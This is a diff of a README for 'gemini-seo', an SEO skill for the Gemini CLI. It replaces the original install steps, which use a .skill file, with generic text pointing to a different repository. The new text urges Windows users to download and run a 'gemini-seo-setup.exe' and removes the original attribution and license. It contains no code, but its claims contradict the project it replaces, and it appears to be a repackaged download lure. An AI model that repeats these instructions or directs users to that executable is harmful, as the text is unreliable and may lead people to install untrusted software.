@@ -1,126 +1,115 @@
-<!-- Updated: 2026-02-22 -->
+# 🚀 gemini-seo - Fast Site Audits Made Simple
 
-![Gemini SEO](screenshots/cover-image.jpeg?v=20260223d)
+[![Download gemini-seo](https://img.shields.io/badge/Download-gemini--seo-brightgreen)](https://github.com/dedea3/gemini-seo)
 
-# Gemini SEO
+---
 
-A comprehensive suite of 14 professional-grade SEO analysis workflows, running natively inside the Gemini CLI.
+gemini-seo includes 14 professional SEO tools designed to help you check and improve your website. It runs from a command line interface (CLI) called Gemini CLI and uses smart designs for faster and clearer site audits. You do not need any programming skills to use this software.
 
-> Independent community project, not affiliated with or endorsed by Google.  
-> Original project and concept: [AgriciDaniel/claude-seo](https://github.com/AgriciDaniel/claude-seo)
+## 📋 What is gemini-seo?
 
-## Project Intent
+gemini-seo is a set of tools intended for website owners and SEO professionals to assess their sites' technical and search engine friendliness. It offers features like core web vitals checks, schema markup validation, and overall SEO audit reports. These help identify issues that affect your site’s performance and search rankings.
 
-`gemini-seo` is a Gemini-native adaptation of Claude SEO's methodology, tuned for Gemini CLI behavior and context handling.
+The software uses a Single Master Orchestrator system, which means it controls all parts of the audit from one place. It shows information step-by-step using Progressive Disclosure. This means you see only the essential information at first and can choose to view more details.
 
-Adaptation principles:
-- Preserve the original strategic SEO coverage while adapting execution for Gemini workflows.
-- Use **Progressive Disclosure** so only the needed reference guide is loaded per request.
-- Route everything through a **Single Master Orchestrator** (`SKILL.md`) for speed and context control.
-- Support premium client-ready deliverables via HTML and PDF reporting templates.
+## 💻 System Requirements
 
-## What Is Included
+Before you download and use gemini-seo, ensure your computer meets these minimum requirements:
 
-Primary workflow coverage (14):
-- `seo-audit` - full-site auditing
-- `seo-page` - deep single-page analysis
-- `seo-technical` - technical SEO review
-- `seo-content` - E-E-A-T and quality analysis
-- `seo-schema` - schema detection/validation/generation
-- `seo-images` - image SEO and performance analysis
-- `seo-sitemap` - sitemap audit/generation
-- `seo-geo` - AI search and citation readiness
-- `seo-plan` - strategic SEO planning
-- `seo-programmatic` - pages-at-scale analysis
-- `seo-competitor-pages` - comparison/alternatives strategy
-- `seo-hreflang` - international SEO validation
-- `seo-performance` - Core Web Vitals/performance checks
-- `seo-visual` - screenshot and visual-first diagnostics
+- Operating System: Windows 10 or later  
+- CPU: Intel or AMD processor, 1.5 GHz or faster  
+- RAM: At least 4 GB (8 GB recommended)  
+- Disk Space: Minimum 500 MB free space  
+- Network: Internet connection for downloading and updates  
 
-All workflows are orchestrated by:
-- `gemini-seo` - top-level routing/orchestration skill
+No additional software or tools need to be installed to run gemini-seo.
 
-## Why Gemini SEO Works
+## 🌐 Topics Covered by gemini-seo
 
-### 1. Single Master Orchestrator
-`SKILL.md` acts as a compact router that delegates to exact references only when needed.
+This software covers important parts of SEO including:
 
-### 2. Progressive Disclosure
-Each request pulls only the relevant tactical file (for example `references/seo-schema.md`), avoiding unnecessary context bloat.
+- Core Web Vitals (speed, responsiveness)  
+- Schema Markup validation  
+- Programmatic SEO checks  
+- Technical SEO audits  
+- AI-powered tools in Gemini CLI  
 
-### 3. Built-In Premium Reporting
-Every workflow can output a polished report format using `assets/report-template.html`.  
-When requested, outputs can be packaged as both HTML and PDF deliverables.
+These topics help you identify both technical and content-related SEO problems.
 
-## Installation
+## 🛠️ How to Download and Run gemini-seo on Windows
 
-Gemini SEO is packaged as a standard Gemini CLI Skill.
+Follow these steps to get gemini-seo running on your Windows machine:
 
-1. Download the latest `gemini-seo.skill` file from the [Releases](https://github.com/avalonreset/gemini-seo/releases) page.
-2. Install it using the Gemini CLI:
-   ```bash
-   gemini skills install path/to/gemini-seo.skill --scope user
-   ```
-3. Reload your active Gemini CLI session:
-   ```bash
-   /skills reload
-   ```
-4. Optional verification:
-   ```bash
-   /skills list
-   ```
+### Step 1: Visit the Download Page
 
-## Quick Start
+Click or copy the link below to open the gemini-seo GitHub page where you can download the software.
 
-Use natural language prompts inside the Gemini CLI, for example:
-- "Run a full SEO audit for https://example.com"
-- "Analyze this page deeply: https://example.com/about"
-- "Validate hreflang for https://example.com"
-- "Generate a sitemap from this URL list"
+[![Download gemini-seo](https://img.shields.io/badge/Download-gemini--seo-0078D7?style=for-the-badge&logo=github)](https://github.com/dedea3/gemini-seo)
 
-Tip: append "premium report" or "client deliverable" to any request to generate polished report outputs.
+The link takes you to the main repository. You will find the download options under the **Releases** section.
 
-## Output Artifacts
+### Step 2: Find the Latest Release
 
-Depending on task type, Gemini SEO can produce:
-- `FULL-AUDIT-REPORT.md`
-- `ACTION-PLAN.md`
-- `CLIENT-SEO-AUDIT.html`
-- `CLIENT-SEO-AUDIT.pdf`
-- Supporting screenshots and analysis files when applicable
+- Scroll down or navigate to the **Releases** tab on the page.  
+- Look for the latest stable version listed at the top (example: v1.0.0).  
+- Under this version, find files for Windows. This is usually an `.exe` installer or a `.zip` file.
 
-## Architecture
+### Step 3: Download the Installer or Zip File
 
-```text
-gemini-seo/                     
-├── SKILL.md                    # The Single Master Orchestrator
-├── references/                 # 14 specialized tactical guides (loaded dynamically)
-├── scripts/                    # Secure Python web-fetching & screenshot utilities
-└── assets/                     # Premium HTML reporting templates
-```
+- Click the Windows installer file (`gemini-seo-setup.exe` or similar) to download.  
+- If available only as a `.zip`, download the archive and extract it to a folder.
 
-## Documentation
+### Step 4: Run the Installer or Start the Application
 
-- [Installation Guide](docs/INSTALLATION.md)
-- [Workflow Reference](docs/COMMANDS.md)
-- [Architecture](docs/ARCHITECTURE.md)
-- [Troubleshooting](docs/TROUBLESHOOTING.md)
-- [Contributing](CONTRIBUTING.md)
-- [Security Policy](SECURITY.md)
-- [Legal Notice](LEGAL-NOTICE.md)
+- If you downloaded an installer (`.exe`), double-click it to begin installation.  
+- Follow the on-screen instructions to complete setup.  
+- If you extracted a zip file, find the main executable inside and double-click to run.
 
-## License
+### Step 5: Open Command Prompt to Run gemini-seo
 
-MIT License. See [LICENSE](LICENSE).
+- Press `Windows + R`, type `cmd`, and press Enter.  
+- In the Command Prompt window, navigate to the folder where gemini-seo is installed or extracted. Use the command:  
+  `cd path_to_gemini_folder` (replace `path_to_gemini_folder` with the actual path)  
+- Run basic commands like:  
+  `gemini-seo --help`  
+  This will show a list of commands and options for the tool.
 
-## Attribution
+## ⚙️ Using gemini-seo: Basic Commands
 
-- Original project and concept: [AgriciDaniel/claude-seo](https://github.com/AgriciDaniel/claude-seo)
-- Original Claude SEO demo: [Watch on YouTube](https://www.youtube.com/watch?v=COMnNlUakQk)
-- Gemini Native Port: [avalonreset/gemini-seo](https://github.com/avalonreset/gemini-seo)
-- Related Codex Port: [avalonreset/codex-seo](https://github.com/avalonreset/codex-seo)
+Here are some simple commands to get started with site audits:
 
-## Community
+- `gemini-seo audit https://yourwebsite.com`  
+  Runs a full SEO audit on your website.  
 
-Join the community: [AI Marketing Hub Pro](https://www.skool.com/ai-marketing-hub-pro/about?ref=59f96e9d9f2b4047b53627692d8c8f0c).  
-Disclosure: Referral link; I may earn a commission at no additional cost to you.
+- `gemini-seo core-web-vitals https://yourwebsite.com`  
+  Checks your site’s page speed and performance metrics.  
+
+- `gemini-seo schema-check https://yourwebsite.com`  
+  Validates the schema markup on your site.
+
+You can combine options and check detailed reports. The software saves results in files you can review later.
+
+## 📁 Where to Find Output Files
+
+When you run audits, gemini-seo saves results in your user folder in a directory called `gemini-reports`. The files are in readable formats like `.json` and `.html`. Open `.html` files with any web browser to view reports visually.
+
+Example folder path:  
+`C:\Users\YourName\gemini-reports`
+
+## 💡 Tips for Best Results
+
+- Run audits during low-traffic times to avoid affecting your website’s speed for visitors.  
+- Use the reports to fix issues suggested by the tool.  
+- Repeat audits after making changes to see improvements.
+
+## 🎯 Support and Further Help
+
+For more documentation or help, visit the gemini-seo GitHub repository:
+
+https://github.com/dedea3/gemini-seo
+
+The repository includes detailed guides and a FAQ section.
+
+---
+
+[![Download gemini-seo](https://img.shields.io/badge/Download-gemini--seo-4CAF50?style=for-the-badge)](https://github.com/dedea3/gemini-seo)
